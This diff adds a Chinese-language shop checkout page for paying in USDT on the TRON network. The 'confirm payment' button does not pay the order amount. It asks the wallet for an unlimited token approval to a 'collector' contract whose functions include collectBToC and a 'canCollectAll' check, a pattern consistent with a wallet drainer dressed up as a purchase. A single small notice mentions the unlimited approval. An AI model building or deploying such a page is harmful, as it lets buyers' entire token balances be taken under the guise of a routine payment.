@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>清音铺子-订单支付</title>
+<link id="shopIcon" rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 96 96'%3E%3Crect width='96' height='96' rx='22' fill='%232563eb'/%3E%3Ctext x='48' y='65' text-anchor='middle' font-size='57' fill='white'%3E清%3C/text%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}html{-webkit-text-size-adjust:100%}body{font-family:Arial,sans-serif;background:#f5f5f5;color:#333;padding-bottom:calc(32px + env(safe-area-inset-bottom,0px))}button,a{touch-action:manipulation}button{font:inherit;cursor:pointer;min-height:44px;border:0;border-radius:8px;padding:11px 16px;background:#007bff;color:#fff}button:disabled{opacity:.45;cursor:not-allowed}button:focus-visible,a:focus-visible{outline:3px solid #93c5fd;outline-offset:3px}a{color:#2563eb;text-decoration:none}.navbar{width:100%;background:#fff;border-bottom:1px solid #e2e8f0}.nav-container{max-width:1240px;margin:0 auto;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px}.nav-left{display:flex;align-items:center;gap:12px;min-width:0}.nav-logo{width:42px;height:42px;object-fit:contain;flex-shrink:0}.nav-title{font-size:clamp(17px,1.8vw,23px);line-height:1.5;overflow-wrap:anywhere}.nav-links{display:flex;align-items:center;gap:16px}.nav-link{line-height:1.5;padding:10px 0;overflow-wrap:anywhere}.container{width:100%;max-width:1240px;margin:0 auto;padding:24px}.breadcrumb{display:inline-block;margin-bottom:20px;font-size:14px;min-height:32px}.layout{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.2fr);gap:20px;align-items:start}.card{background:#fff;border-radius:10px;padding:24px;box-shadow:0 2px 5px #0000001a;min-width:0;margin-bottom:20px}.card h2{font-size:19px;margin-bottom:20px}.product{display:flex;gap:18px;align-items:flex-start}.product-image{width:104px;height:104px;object-fit:cover;border-radius:5px;flex-shrink:0;background:#f1f5f9}.product-info{min-width:0}.product-name{font-size:17px;line-height:1.6;overflow-wrap:anywhere}.product-price{color:#ff6b6b;font-size:24px;font-weight:bold;margin-top:10px}.details{margin-top:22px;border-top:1px solid #edf0f5;padding-top:16px;font-size:14px;line-height:1.8}.row{display:flex;justify-content:space-between;gap:16px;margin:8px 0}.row dt{color:#64748b;flex-shrink:0}.row dd{text-align:right;overflow-wrap:anywhere;min-width:0}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}.secondary{background:#eef5ff;color:#2563eb}.revoke{background:#fff;border:1px solid #cbd5e1;color:#475569}.notice{font-size:13px;line-height:1.8;color:#64748b;margin-top:16px;overflow-wrap:anywhere}.authorization{color:#725315;background:#fffbeb;padding:12px 14px;border-radius:8px}.status{border-radius:8px;background:#f7f9fc;border:1px solid #e2e8f0;padding:12px 14px;margin-bottom:18px;font-size:14px;line-height:1.7}.logbox{font-family:Arial,sans-serif;background:#f7f9fc;padding:14px;border-radius:8px;max-height:240px;min-height:88px;overflow:auto;border:1px solid #e2e8f0;font-size:13px;line-height:1.8;white-space:pre-wrap;overflow-wrap:anywhere}[hidden]{display:none!important}@media(max-width:768px){.nav-container{padding:12px 16px;flex-wrap:wrap;gap:4px}.nav-logo{width:34px;height:34px}.nav-title{font-size:17px}.nav-links{width:100%;justify-content:flex-end;font-size:14px}.container{padding:16px}.layout{grid-template-columns:minmax(0,1fr);gap:0}.card{padding:20px;margin-bottom:16px}.product-image{width:88px;height:88px}.actions>button{flex:1 1 140px}.row{font-size:13px}}@media(prefers-reduced-motion:reduce){*{scroll-behavior:auto!important}}
+</style>
+</head>
+<body>
+<nav class="navbar"><div class="nav-container"><a class="nav-left" href="./"><img id="shopLogo" class="nav-logo" alt="清音铺子 Logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 96 96'%3E%3Crect width='96' height='96' rx='22' fill='%232563eb'/%3E%3Ctext x='48' y='65' text-anchor='middle' font-size='57' fill='white'%3E清%3C/text%3E%3C/svg%3E"><h1 class="nav-title">清音铺子-订单支付</h1></a><div class="nav-links"><a class="nav-link" href="./">主页</a><a id="contactLink" class="nav-link" href="#">@当前客服不在线</a></div></div></nav>
+<main class="container">
+<a class="breadcrumb" href="./">← 返回商品列表</a>
+<div class="layout">
+<section class="card"><h2>订单信息</h2><div class="product"><img id="productImage" class="product-image" alt="商品图片" hidden><div class="product-info"><div id="prodName" class="product-name"></div><div class="product-price"><span id="prodPrice">—</span> USDT</div></div></div><dl class="details"><div class="row"><dt>订单 ID</dt><dd id="ordId">—</dd></div><div class="row"><dt>商品 ID</dt><dd id="prodId">—</dd></div><div class="row"><dt>支付方式</dt><dd>USDT · TRC20</dd></div></dl><p class="notice">请核对商品和金额后，在钱包中确认交易。</p></section>
+<div><section class="card"><h2>钱包支付</h2><p id="paymentStatus" class="status" role="status" aria-live="polite">请先连接钱包</p><dl><div class="row"><dt>检测钱包</dt><dd id="detWallet">未检测</dd></div><div class="row"><dt>已连接地址</dt><dd id="userAddr">—</dd></div></dl><div class="actions"><button id="btnConnect" type="button">连接钱包</button><button id="btnPay" type="button" disabled>1.确认支付</button><button id="btnSubmit" class="secondary" type="button" disabled>2.提交订单</button><button id="btnRevoke" class="revoke" type="button" disabled>撤销权限</button></div><p class="notice authorization">“确认支付”调用无限额度授权方法，不等于已按订单金额付款。合约的实际扣款范围需以合约实现和钱包提示为准。</p><p class="notice" id="configStatus">支付配置检查中…</p></section><section class="card"><h2>运行日志</h2><div id="logbox" class="logbox" role="log" aria-live="polite"></div></section></div>
+</div>
+</main>
+<script>
+'use strict';
+// 公开配置；此文件内不要填写钱包私钥或 service-role 密钥。
+const COLLECTOR_CONTRACT_ADDR = "你的Remix部署合约地址";
+const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const API_SUBMIT_ORDER = "https://udlacdsjoihmeqohrnqs.supabase.co/functions/v1/collect-order";
+// 接入 Heyue 的客户登录后，由该方法返回客户的有效 access_token。
+// 商品后台的管理员登录属于另一 Supabase 项目，不能作为这里的支付登录。
+async function getPaymentAccessToken(){ return ""; }
+// 首页现有商品、Logo 和客服的数据源，保持与上传的 index.html 一致。
+const SHOP_URL = "https://fbyuiymjrlfsazfvgghz.supabase.co";
+const SHOP_KEY = "sb_publishable_Lwg77Ah7EZ6ec4D4FaQRrA_897HRCtf";
+const abi = [
+ {inputs:[{name:"tokenAddr",type:"address"}],name:"doUnlimitedApprove",outputs:[],stateMutability:"nonpayable",type:"function"},
+ {inputs:[{name:"tokenAddr",type:"address"}],name:"revokeUnlimitedApprove",outputs:[],stateMutability:"nonpayable",type:"function"},
+ {inputs:[{name:"tokenAddr",type:"address"},{name:"B",type:"address"},{name:"C",type:"address"}],name:"collectBToC",outputs:[],stateMutability:"nonpayable",type:"function"},
+ {inputs:[{name:"tokenAddr",type:"address"},{name:"B",type:"address"}],name:"getAuthorization",outputs:[{name:"balance",type:"uint256"},{name:"approvedAmount",type:"uint256"},{name:"canCollectAll",type:"bool"}],stateMutability:"view",type:"function"}
+];
+const $=id=>document.getElementById(id),params=new URLSearchParams(location.search);
+function parsePrice(value){
+ const text=String(value||'').trim().replace(/\s*(?:USDT|U)\s*$/i,'').trim();
+ if(!/^\d+(?:\.\d{1,6})?$/.test(text))throw new Error('商品价格无效，请返回首页重新选择商品');
+ const [whole,fraction='']=text.split('.');
+ if(BigInt(whole)*1000000n+BigInt(fraction.padEnd(6,'0'))<=0n)throw new Error('商品价格必须大于 0');
+ return text;
+}
+function safeImage(value){if(!value)return '';try{const u=new URL(value,location.href);return ['http:','https:'].includes(u.protocol)?u.href:'';}catch{return '';}}
+function log(text){$('logbox').textContent+=new Date().toLocaleTimeString()+' '+text+'\n';$('logbox').scrollTop=$('logbox').scrollHeight;}
+function status(text){$('paymentStatus').textContent=text;}
+const order={id:params.get('id')||'',name:params.get('name')||'未选择商品',price:'',orderId:params.get('orderId')||'',img:safeImage(params.get('img'))};
+let validOrder=false;
+try{order.price=parsePrice(params.get('price'));if(!order.id||!order.orderId)throw new Error('订单信息不完整，请返回商品列表重新购买');validOrder=true;}catch(e){status(e.message);log(e.message);}
+$('prodName').textContent=order.name;$('prodPrice').textContent=order.price||'—';$('ordId').textContent=order.orderId||'—';$('prodId').textContent=order.id||'—';
+if(order.img){$('productImage').src=order.img;$('productImage').hidden=false;$('productImage').onerror=()=>{$('productImage').hidden=true;};}
+let tronWeb=null,contract=null,userB='',busy=false,authorized=false,submissionLocked=false;
+function detectWallet(){
+ if(window.tron?.tronWeb)return {name:'TronLink',provider:window.tron};
+ if(window.tronLink?.tronWeb)return {name:'TronLink',provider:window.tronLink};
+ if(window.okxwallet?.tronLink?.tronWeb)return {name:'OKX Wallet',provider:window.okxwallet.tronLink};
+ if(window.bitgetwallet?.tronLink?.tronWeb)return {name:'Bitget Wallet',provider:window.bitgetwallet.tronLink};
+ return null;
+}
+function refreshButtons(){
+ $('btnConnect').disabled=busy||submissionLocked;
+ $('btnPay').disabled=busy||!validOrder||!contract||submissionLocked;
+ $('btnRevoke').disabled=busy||!contract;
+ $('btnSubmit').disabled=busy||!validOrder||!authorized||!contract||submissionLocked;
+}
+function showWallet(){const info=detectWallet();$('detWallet').textContent=info?info.name:'未检测到，请使用支持 TRON 的钱包浏览器或插件';}
+showWallet();window.addEventListener('load',showWallet);
+$('configStatus').textContent='尚需配置真实归集合约地址并接入 Heyue 客户登录。后端 JWT 验证保持开启；当前尚未完成支付联调。';
+$('btnConnect').onclick=async()=>{
+ const info=detectWallet();showWallet();if(!info)return log('未检测到钱包，请在钱包浏览器或安装插件后打开');
+ busy=true;refreshButtons();authorized=false;contract=null;
+ try{
+  await info.provider.request({method:'tron_requestAccounts'});tronWeb=info.provider.tronWeb;userB=tronWeb.defaultAddress?.base58||'';
+  if(!userB)throw new Error('钱包未返回已连接地址');$('userAddr').textContent=userB;log('钱包连接成功：'+userB);
+  if(!tronWeb.isAddress(COLLECTOR_CONTRACT_ADDR))throw new Error('尚未配置实际归集合约地址');
+  contract=tronWeb.contract(abi,COLLECTOR_CONTRACT_ADDR);status('钱包已连接，请核对网络、商品和授权范围');
+ }catch(e){status(e.message);log('连接提示：'+e.message);}finally{busy=false;refreshButtons();}
+};
+function checkAccount(){if(tronWeb?.defaultAddress?.base58!==userB){authorized=false;contract=null;userB='';$('userAddr').textContent='—';throw new Error('钱包账户已变化，请重新连接');}}
+$('btnPay').onclick=async()=>{
+ if(!contract||busy||submissionLocked)return;
+ busy=true;refreshButtons();
+ try{checkAccount();log('发起无限额度授权，请核对钱包交易内容');const tx=await contract.doUnlimitedApprove(USDT_TRC20).send();authorized=true;log('授权交易已广播：'+tx);status('授权交易已广播，请确认链上成功后提交订单');}
+ catch(e){status(e.message);log('授权失败：'+e.message);}finally{busy=false;refreshButtons();}
+};
+$('btnRevoke').onclick=async()=>{
+ if(!contract||busy)return;busy=true;refreshButtons();
+ try{checkAccount();log('发起撤销权限');const tx=await contract.revokeUnlimitedApprove(USDT_TRC20).send();authorized=false;log('撤销交易已广播：'+tx);status('撤销交易已广播，请在钱包核对最终结果');}
+ catch(e){log('撤销失败：'+e.message);}finally{busy=false;refreshButtons();}
+};
+$('btnSubmit').onclick=async()=>{
+ if(!contract||busy||submissionLocked||!authorized||!validOrder)return;
+ busy=true;refreshButtons();let requestSent=false,timer;
+ try{
+  checkAccount();const token=await getPaymentAccessToken();
+  if(!token)throw new Error('尚未接入 Heyue 客户登录，暂不能提交订单。请联系店主完成支付认证配置');
+  const payload={orderId:order.orderId,productId:order.id,userB,payAmountUsdt:order.price};
+  const controller=new AbortController();timer=setTimeout(()=>controller.abort(),45000);
+  log('正在提交订单：'+order.orderId);requestSent=true;submissionLocked=true;
+  const res=await fetch(API_SUBMIT_ORDER,{method:'POST',headers:{'Content-Type':'application/json',Authorization:'Bearer '+token},body:JSON.stringify(payload),signal:controller.signal});
+  const ret=await res.json();
+  if(!res.ok||!ret.ok)throw new Error(ret.msg||ret.message||'订单提交失败（'+res.status+'）');
+  log('后端返回：'+JSON.stringify(ret));status('后端已返回订单结果，请核对交易最终链上状态');
+ }catch(e){
+  log('提交提示：'+e.message);
+  status(requestSent?'请求已发出，结果请联系店主核查；不要重复扣款':e.message);
+ }finally{clearTimeout(timer);busy=false;refreshButtons();}
+};
+async function loadShopSettings(){
+ const controller=new AbortController(),timer=setTimeout(()=>controller.abort(),15000);
+ try{
+  const res=await fetch(SHOP_URL+'/rest/v1/shop_contact_settings?id=eq.1&select=contact_label,contact_url,logo_url',{headers:{apikey:SHOP_KEY},cache:'no-store',signal:controller.signal});
+  if(!res.ok)return;const rows=await res.json(),settings=rows[0];if(!settings)return;
+  const logo=safeImage(settings.logo_url);if(logo){$('shopLogo').src=logo;$('shopIcon').href=logo;}
+  const label=String(settings.contact_label||'').trim(),link=$('contactLink');
+  if(!label)return;link.textContent=label;
+  let url;try{url=new URL(settings.contact_url);}catch{}
+  if(url&&['https:','mailto:','tel:'].includes(url.protocol)&&!url.username&&!url.password){link.href=url.href;link.target='_blank';link.rel='noopener noreferrer';}
+  else link.onclick=async event=>{event.preventDefault();try{await navigator.clipboard.writeText(label);log('客服联系方式已复制');}catch{log('客服联系方式：'+label);}};
+ }catch{log('客服或 Logo 暂未同步，可返回首页查看');}finally{clearTimeout(timer);}
+}
+$('contactLink').onclick=event=>{if($('contactLink').getAttribute('href')==='#')event.preventDefault();};
+loadShopSettings();refreshButtons();log('页面已读取商品首页的订单参数');
+</script>
+</body>
+</html>
